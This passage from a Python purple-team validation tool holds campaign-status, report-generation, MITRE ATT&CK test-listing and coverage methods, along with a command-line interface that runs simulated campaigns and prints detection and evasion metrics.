            'detection_rate': report.detection_rate,
            'evasion_rate': report.evasion_rate,
            'tests_executed': report.tests_executed,
            'gaps_found': len(report.detection_gaps),
            'top_recommendations': report.ai_recommendations[:5]
        }
    
    def generate_reports(
        self,
        campaign_id: str = None,
        formats: List[str] = None
    ) -> Dict[str, str]:
        """Generate reports for a campaign"""
        campaign = self.campaigns.get(campaign_id) if campaign_id else self.current_campaign
        if not campaign:
            raise ValueError("No campaign found")
        
        format_enums = []
        for fmt in (formats or ['html', 'json']):
            try:
                format_enums.append(ReportFormat(fmt.lower()))
            except ValueError:
                continue
        
        return self.report_generator.save_report(campaign, format_enums)
    
    def get_campaign_status(self, campaign_id: str = None) -> Dict:
        """Get current campaign status"""
        campaign = self.campaigns.get(campaign_id) if campaign_id else self.current_campaign
        if not campaign:
            return {'status': 'no_campaign'}
        
        return {
            'campaign_id': campaign.report_id,
            'name': campaign.campaign_name,
            'status': 'completed' if campaign.end_time else 'in_progress',
            'tests_total': campaign.total_tests,
            'tests_executed': campaign.tests_executed,
            'detection_rate': campaign.detection_rate,
            'evasion_rate': campaign.evasion_rate,
            'gaps_found': len(campaign.detection_gaps)
        }
    
    def get_available_tests(self) -> Dict:
        """Get available tests organized by tactic"""
        tests_by_tactic = {}
        for tactic_id, tactic_info in MITRE_TACTICS.items():
            tests = AtomicTestLibrary.get_tests_by_tactic(tactic_id)
            if tests:
                tests_by_tactic[tactic_id] = {
                    'name': tactic_info['name'],
                    'color': tactic_info['color'],
                    'tests': [
                        {
                            'test_id': t.test_id,
                            'name': t.name,
                            'technique_id': t.technique_id,
                            'technique_name': t.technique_name
                        }
                        for t in tests
                    ]
                }
        return tests_by_tactic
    
    def get_technique_coverage(self) -> Dict:
        """Get technique coverage statistics"""
        all_tests = AtomicTestLibrary.get_all_tests()
        techniques = {}
        
        for test in all_tests:
            if test.technique_id not in techniques:
                techniques[test.technique_id] = {
                    'name': test.technique_name,
                    'tactic': test.tactic,
                    'test_count': 0
                }
            techniques[test.technique_id]['test_count'] += 1
        
        return {
            'total_techniques': len(techniques),
            'total_tests': len(all_tests),
            'techniques': techniques
        }
    
    def export_campaign_data(self, campaign_id: str = None) -> Dict:
        """Export full campaign data"""
        campaign = self.campaigns.get(campaign_id) if campaign_id else self.current_campaign
        if not campaign:
            return {}
        
        return {
            'report_id': campaign.report_id,
            'campaign_name': campaign.campaign_name,
            'start_time': campaign.start_time.isoformat(),
            'end_time': campaign.end_time.isoformat() if campaign.end_time else None,
            'target_environment': campaign.target_environment,
            'edr_vendors': campaign.edr_vendors,
            'metrics': {
                'total_tests': campaign.total_tests,
                'tests_executed': campaign.tests_executed,
                'detection_rate': campaign.detection_rate,
                'evasion_rate': campaign.evasion_rate
            },
            'mitre_coverage': campaign.mitre_coverage,
            'detection_gaps': [
                {
                    'gap_id': g.gap_id,
                    'technique_id': g.technique_id,
                    'technique_name': g.technique_name,
                    'severity': g.severity.value,
                    'description': g.description,
                    'recommendation': g.recommendation,
                    'remediation_steps': g.remediation_steps
                }
                for g in campaign.detection_gaps
            ],
            'ai_recommendations': campaign.ai_recommendations,
            'executive_summary': campaign.executive_summary
        }


# ============================================================================
# CLI INTERFACE
# ============================================================================

def main():
    """CLI interface for Purple Team Validator"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Purple Team Validation Tool")
    parser.add_argument('--campaign', '-c', help='Campaign name')
    parser.add_argument('--tactics', '-t', nargs='+', help='Tactics to test (e.g., TA0001 TA0002)')
    parser.add_argument('--techniques', '-T', nargs='+', help='Specific techniques to test')
    parser.add_argument('--output', '-o', default='/tmp/purple_reports', help='Output directory')
    parser.add_argument('--format', '-f', nargs='+', default=['html', 'json'], help='Report formats')
    parser.add_argument('--quick', '-q', action='store_true', help='Quick assessment mode')
    parser.add_argument('--list-tests', action='store_true', help='List available tests')
    
    args = parser.parse_args()
    
    validator = PurpleTeamValidator()
    
    if args.list_tests:
        tests = validator.get_available_tests()
        for tactic_id, data in tests.items():
            print(f"\n{data['name']} ({tactic_id}):")
            for test in data['tests']:
                print(f"  - {test['test_id']}: {test['name']}")
        return
    
    if args.quick:
        print("Running quick assessment...")
        result = validator.run_quick_assessment(args.techniques)
        print(f"\nQuick Assessment Results:")
        print(f"  Detection Rate: {result['detection_rate']:.1%}")
        print(f"  Tests Executed: {result['tests_executed']}")
        print(f"  Gaps Found: {result['gaps_found']}")
        print(f"\nTop Recommendations:")
        for i, rec in enumerate(result['top_recommendations'], 1):
            print(f"  {i}. {rec}")
        return
    
    # Full campaign
    campaign_name = args.campaign or f"Purple Team Validation {datetime.now().strftime('%Y-%m-%d')}"
    
    print(f"Creating campaign: {campaign_name}")
    campaign_id = validator.create_campaign(
        name=campaign_name,
        tactics=args.tactics,
        techniques=args.techniques
    )
    
    print("Running validation tests...")
    report = validator.run_campaign(campaign_id, simulate=True)
    
    print(f"\n{'='*60}")
    print(f"CAMPAIGN COMPLETE: {campaign_name}")
    print(f"{'='*60}")
    print(f"Tests Executed: {report.tests_executed}")
    print(f"Detection Rate: {report.detection_rate:.1%}")
    print(f"Evasion Rate: {report.evasion_rate:.1%}")
    print(f"Detection Gaps: {len(report.detection_gaps)}")
    
    print("\nGenerating reports...")
    saved = validator.generate_reports(campaign_id, args.format)
    for fmt, path in saved.items():
        print(f"  {fmt.upper()}: {path}")
    
    print("\n" + report.executive_summary)
    
    # PRO Features
    print("\n" + "=" * 60)
    print("[PURPLE TEAM VALIDATOR PRO]")
    try:
        from tools.purple_team_validator_pro import get_pro_engines
        pro_engines = get_pro_engines()
        print("✓ EDR-Specific Detection Heatmap: ENABLED")
        print("✓ AI Weakness Analyzer: ENABLED")
        print("✓ Encrypted PDF Reports: ENABLED")
        print("✓ Blue Team Playbook Generator: ENABLED")
        print("\n[PRO] Rating: 10/10 - Enterprise Purple Team Suite")
    except ImportError:
        print("✗ PRO features not available")
    print("=" * 60)


if __name__ == "__main__":
    main()
